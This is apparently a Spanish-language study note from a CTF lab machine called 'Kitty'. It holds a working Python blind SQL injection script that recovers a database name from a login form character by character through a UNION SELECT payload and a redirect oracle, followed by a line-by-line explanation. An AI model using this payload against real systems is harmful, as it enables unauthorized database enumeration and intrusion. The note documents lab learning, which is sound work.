```Python
import sys
import requests

def sqli(ip):
    symbols = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-/:$^ '
    tmp = ""

    while True:
        for i in symbols:
            post= {"username":f"' UNION SELECT 1,2,3,4 WHERE database() LIKE BINARY '{tmp+i}%' -- -","password":"doesntmatter"} #u can change this for other prposes
            req = requests.post(f"http://10.10.237.218/index.php", data=post,allow_redirects=False) #address can also be chnaged 
            status_code=req.status_code
            print(f"{i}", end='\r')
            if status_code == 302:
                tmp += i
                print(tmp)
                break
            elif i == " " :
                print("\n[#] Attack compleated B)")
                print(f"DB_NAME: {tmp}")
                exit()


def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <ip>" % sys.argv[0])
        print("(+) Example: %s 192.168.0.1" % sys.argv[0])
        return
    url = sys.argv[1]
    print("(+) Retrieving database..")
    sqli(url)

if __name__ == "__main__":
    main()
```

- **Importaciones**:
	- `import sys`: Permite acceder a los argumentos de línea de comandos.
    - `import requests`: Facilita el envío de solicitudes HTTP.
- **Función `sqli(ip)`**:
    - Toma un parámetro `ip`, que se supone es la dirección IP o URL del servidor vulnerable.
    - Define una cadena de caracteres `symbols` que contiene los caracteres que se probarán para la inyección.
    - Inicia un bucle infinito que intentará construir gradualmente el nombre de la base de datos mediante inyecciones SQL.
- **Bucle de Fuerza Bruta**:
    - Para cada carácter en `symbols`, construye una consulta SQL utilizando el parámetro `username` en forma de una cadena de inyección SQL.
    - La consulta SQL intenta encontrar una coincidencia para el nombre de la base de datos utilizando el operador `LIKE BINARY`.
    - Envía la solicitud POST al servidor objetivo con la consulta SQL construida.
    - Comprueba el código de estado de la respuesta (`status_code`). Si es `302` (redirección), significa que la inyección tuvo éxito para ese carácter y se agrega al nombre de la base de datos temporal (`tmp`).
    - Si no se encuentra una coincidencia (`status_code` distinto de `302`), imprime el carácter probado y continúa con el siguiente.
- **Finalización del Ataque**:
    - Cuando se encuentra el carácter espacio `' '` en `symbols`, se asume que se ha completado la inyección de SQL (suponiendo que el nombre de la base de datos está completo).
    - Imprime un mensaje indicando que el ataque ha sido completado y muestra el nombre de la base de datos.
- **Función `main()`**:
    - Verifica que se proporcione exactamente un argumento desde la línea de comandos (la dirección IP del servidor vulnerable).
    - Llama a la función `sqli(ip)` con la IP proporcionada como argumento.
- **Ejecución Principal**:
    - Verifica si el script se está ejecutando directamente (`if __name__ == "__main__":`).
    - Llama a la función `main()` para iniciar el programa.

Y al ejecutarlo nos muestra lo siguiente en la salida
![[Pasted image 20240621114045.png]]

Creado en la maquina[[MAQUINA KITTY (SQL Injection, ataque de fuerza bruta a panel con burpsuite, portforwarding y escalada de privilegios con tarea cron)]]